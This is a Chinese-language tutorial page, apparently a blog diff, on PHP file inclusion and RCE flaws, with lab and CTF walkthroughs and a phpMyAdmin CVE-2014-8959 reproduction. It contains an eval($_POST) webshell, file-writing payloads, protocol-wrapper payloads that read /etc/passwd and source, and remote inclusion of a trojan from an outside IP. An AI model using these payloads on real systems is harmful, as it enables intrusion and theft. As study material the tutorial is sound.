+<h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>PHP的include表达式会引入被包含的文件，并且在此文件中查找可执行的php代码部分并执行。</p>
+<p>include的路径可以为绝对路径，也可以为相对路径，并且支持 ../ 查找目录的上级目录。</p>
+<p>index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1.txt</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问：?file=1.txt</p>
+<p><img src="/2023/01221/100.PNG" alt="100"></p>
+<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p><strong>本地文件包含</strong></p>
+<p>本地包含文件需要指定目标服务器本地的一个文件</p>
+<p><strong>远程文件包含</strong></p>
+<p>远程文件包含需要指定一个远程文件的地址，这个地址我们可以自己构造</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p><strong>无限制直接包含</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=1.txt">http://127.0.0.1?file=1.txt</a></p>
+<p><strong>包含计算机上的其他文件</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=../../../a.txt">http://127.0.0.1?file=../../../a.txt</a></p>
+<p><img src="/2023/01221/101.PNG" alt="101"></p>
+<p><strong>注意</strong>：../ 是向上级目录跳,加很多会从下级向上级目录跳到根目录下，并非从下级向上级的目录遍历</p>
+<p><strong>限制扩展名的包含</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>00截断</p>
+<p>条件：php&lt;5.3.4 magic_quotes_gpc=Off</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=1.txt%00">http://127.0.0.1/?file=1.txt%00</a></p>
+<p><img src="/2023/01221/102.PNG" alt="102"></p>
+<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>代码会进行限制：allow_url_include = On</p>
+<p><strong>无限制</strong></p>
+<p>index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>准备一个远程的木马地址：<a target="_blank" rel="noopener" href="http://124.222.3.192:8000/1.txt">http://124.222.3.192:8000/1.txt</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt">http://127.0.0.1/?file=http://124.222.3.192:8000/1.txt</a></p>
+<p>使用phpstudy构造远程地址：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt">http://127.0.0.1/1.txt</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a></p>
+<p><strong>有后缀限制</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt">http://127.0.0.1/?file=http://127.0.0.1/1.txt</a>?</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=http://127.0.0.1/1.txt%23">http://127.0.0.1/?file=http://127.0.0.1/1.txt%23</a></p>
+<p>原理：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt?.html">http://127.0.0.1/1.txt?.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt#.html">http://127.0.0.1/1.txt#.html</a></p>
+<p>加了问号或者#号（%23编码就是#号），再访问链接显示的还是原来的页面</p>
+<h4 id="协议流绕过"><a href="#协议流绕过" class="headerlink" title="协议流绕过"></a>协议流绕过</h4><p>php支持的协议</p>
+<p><img src="/2023/01221/107.PNG" alt="107"></p>
+<p>使用代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h5><p><strong>php://filter</strong></p>
+<p>php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
+<p><strong>读取文件：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php#读取某个网页源码，获取被注释掉的flag(常用)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/103.PNG" alt="103"></p>
+<p>得到的是base64编码的字符串，解码即可查看源码</p>
+<p><strong>读取上级目录文件：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=../../../a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>读取其他文件：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=F:\b.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>php://input</strong></p>
+<p>将post请求中的数据作为PHP代码执行，回显出现在header中</p>
+<p>访问：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/?file=php://input</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发送post请求，请求内容为要执行的PHP代码</p>
+<p><img src="/2023/01221/104.PNG" alt="104"></p>
+<p>写入木马的php代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>访问本地文件系统，所有语言都支持，file协议需要传入绝对路径（完整路径）。</p>
+<p>读取windows文件</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//D:/a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=file://D:/a.txt">http://127.0.0.1?file=file://D:/a.txt</a></p>
+<p>读取linux文件</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?file=file:///etc/passwd">http://127.0.0.1?file=file:///etc/passwd</a></p>
+<h5 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h5><p>读取数据流</p>
+<ul>
+<li><p>allow_url_fopen ：on</p>
+</li>
+<li><p>allow_url_include：on</p>
+</li>
+</ul>
+<p>执行php代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">data://text/plaindata://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">%</span><span class="token number">20</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>eg:<a target="_blank" rel="noopener" href="http://127.0.0.1/?file=data://text/plaindata://text/plain">http://127.0.0.1?file=data://text/plaindata://text/plain</a>,<?php%20phpinfo()?></p>
+<p>以base64的形式，执行</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   base64编码=>  PD9waHAgcGhwaW5mbygpPz4=
+    
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>eg:<a target="_blank" rel="noopener" href="http://127.0.0.1/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
+<h3 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h3><h4 id="DVWA靶场File-Inclusion"><a href="#DVWA靶场File-Inclusion" class="headerlink" title="DVWA靶场File Inclusion"></a>DVWA靶场File Inclusion</h4><ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ul>
+<p>靶场为安装，待定</p>
+<h4 id="ACTF2020-Include"><a href="#ACTF2020-Include" class="headerlink" title="ACTF2020 Include"></a>ACTF2020 Include</h4><p>使用php协议中的php://filter协议读取网页源码，解码base64,找到被注释的flag</p>
+<p><img src="/2023/01221/105.PNG" alt="105"></p>
+<h4 id="HCTF-2018-Warmup-暂未做"><a href="#HCTF-2018-Warmup-暂未做" class="headerlink" title="HCTF-2018-Warmup(暂未做)"></a>HCTF-2018-Warmup(暂未做)</h4><p>代码审计</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
+   <span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
+       <span class="token punctuation">&#123;</span>
+            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span>
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
+                <span class="token variable">$page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
+           <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span>
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
+                <span class="token variable">$_page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
+           <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+       <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+   <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">exit</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" 
+/>"</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>  
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>主要判断：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$page</span>不为空并且为字符串
+<span class="token variable">$page</span>在白名单中，直接返回<span class="token constant boolean">true</span>
+处理过的<span class="token variable">$_page</span>在白名单中，直接返回<span class="token constant boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>主要代码分析：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
+    <span class="token variable">$page</span><span class="token punctuation">,</span>
+    <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment"># mb_strpos($page . '?', '?') 查找字符串第一次出现?的位置</span>
+<span class="token comment"># mb_substr 从字符串中截取部分，截取字符串开始至第一次出现?的部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>经过mb_substr函数处理过的结果：source.php</p>
+<p>最终include文件 source.php?/../../../../ffffllllaaaagggg</p>
+<p>payload2:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">253</span>F<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="CVE-2014-8959-phpMyAdmin任意文件包含"><a href="#CVE-2014-8959-phpMyAdmin任意文件包含" class="headerlink" title="CVE-2014-8959 phpMyAdmin任意文件包含"></a>CVE-2014-8959 phpMyAdmin任意文件包含</h4><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<p>漏洞利用有两个前提：</p>
+<ol>
+<li><p>能登陆phpMyAdmin，满足phpmyadmin的安全检查</p>
+</li>
+<li><p>需要截断，需要满足下面的要求之一</p>
+<ul>
+<li><p>PHP的版本需要小于 5.3.4 且gpc关闭</p>
+</li>
+<li><p>利用长文件名截断</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>环境：vulfocus/phpmyadmin-cve_2014_8959:latest</p>
+<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;phpmyadmin-cve_2014_8959:latest
+
+docker run -d -p 8080:80 vulfocus&#x2F;phpmyadmin-cve_2014_8959:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>漏洞复现：</strong></p>
+<p>测试账号：pmatest:pmatest</p>
+<p>漏洞url:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//&lt;IP>/pma/gis_data_editor.php?</span>
+token<span class="token operator">=</span>effa7667f41b469bde9c43d6e814f9a4<span class="token operator">&amp;&amp;</span>gis_data<span class="token punctuation">[</span>gis_type<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token number">1.</span>gif<span class="token operator">%</span><span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>phpMyAdmin地址：<a href="http://ip:port/pma">http://ip:port/pma</a></p>
+<p>1、token可以在登录后在url中获取</p>
+<p>2、访问的同时post参数 a=phpinfo(); // 任意php代码</p>
+<p><img src="/2023/01221/106.PNG" alt="106"></p>
+<p>(hacker 有问题，没测试post传参)</p>
+<p><strong>注：</strong>此漏洞可以实现任意文件包含</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
+<li>固定引用文件的扩展名</li>
+<li>固定引用文件的名称</li>
+<li>WAF</li>
+</ul>
+<h2 id="RCE代码-amp-命令执行漏洞"><a href="#RCE代码-amp-命令执行漏洞" class="headerlink" title="RCE代码&amp;命令执行漏洞"></a>RCE代码&amp;命令执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>RCE：<strong>Remote Command/Code Execute</strong>，远程代码/命令执行。</p>
+<p>在Web应用中有时候程序员会使用代码调用代码或调用系统命令。</p>
+<p>如果应用在执行以上操作时，没有考虑用户是否能控制这个字符串的话，将造成代码执行漏洞或者命令执行漏洞</p>
+<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>代码执行危害：根据服务器语言不同，可导致PHP、Java、Python等任意代码执行</p>
+<p>命令执行危害：导致任意<strong>系统命令</strong>执行（getshell）</p>
+<h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><p>index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>eval($c)：eval函数会把$c当做php代码执行。</p>
+<p>访问： <a target="_blank" rel="noopener" href="http://127.0.0.1/?c=phpinfo()">http://127.0.0.1?c=phpinfo()</a>; <strong>注意带分号</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用代码执行去写入一个木马文件：</p>
+<p>写入木马的代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://127.0.0.1?c=fputs(fopen('a.php','w'),'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><p>index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>system($c)：system函数会把$c当做系统命令执行。</p>
+<p>访问：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/?c=ipconfig">http://127.0.0.1/?c=ipconfig</a></p>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><ul>
+<li>用户可控变量</li>
+<li>漏洞函数</li>
+</ul>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>怎么找RCE：根据网站应用不同来查找</p>
+<ul>
+<li><p>白盒测试：</p>
+<ul>
+<li>代码审计</li>
+</ul>
+</li>
+<li><p>黑盒测试：</p>
+<ul>
+<li><p>漏扫工具</p>
+</li>
+<li><p>nday漏洞</p>
+</li>
+<li><p>手动测试</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="RCE危险函数"><a href="#RCE危险函数" class="headerlink" title="RCE危险函数"></a>RCE危险函数</h3><p>php中命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</p>
+<p>php中代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p>
